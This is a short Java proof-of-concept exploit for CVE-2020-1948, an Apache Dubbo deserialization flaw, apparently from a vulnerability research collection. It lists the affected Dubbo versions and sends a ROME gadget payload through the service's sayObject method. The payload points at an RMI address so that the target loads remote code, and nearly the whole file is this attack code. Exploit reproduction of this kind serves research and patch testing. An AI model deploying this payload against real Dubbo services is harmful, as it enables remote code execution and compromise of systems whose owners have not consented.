package org.example;

//import com.rometools.rome.feed.impl.EqualsBean;
//import com.rometools.rome.feed.impl.ToStringBean;
//import com.sun.syndication.feed.impl.EqualsBean;
//import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.dubbo.config.annotation.Reference;
import org.example.api.DemoService;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.Bean;

/**
 * @author Whoopsunix
 *
 * CVE-2020-1948
 *
 * 2.5.x、[2.6.0, 2.6.7]、[2.7.0, 2.7.6]、2.7.7
 */
@EnableAutoConfiguration
public class CVE_2020_1948 {

    @Reference(version = "1.0", url = "dubbo://127.0.0.1:12345")
    private DemoService demoService;

    public static void main(String[] args) {
        SpringApplication.run(CVE_2020_1948.class).close();
    }

    @Bean
    public void runner() throws Exception{
        // 注意设置 consumer dubbo 版本与 provider 一致
//        String result = demoService.sayHello("Whoopsunix");
//        System.out.println(result);

        demoService.sayObject(GadgetBuilder.romePayload("rmi://127.0.0.1:1099/sbm9gt"));
    }
}
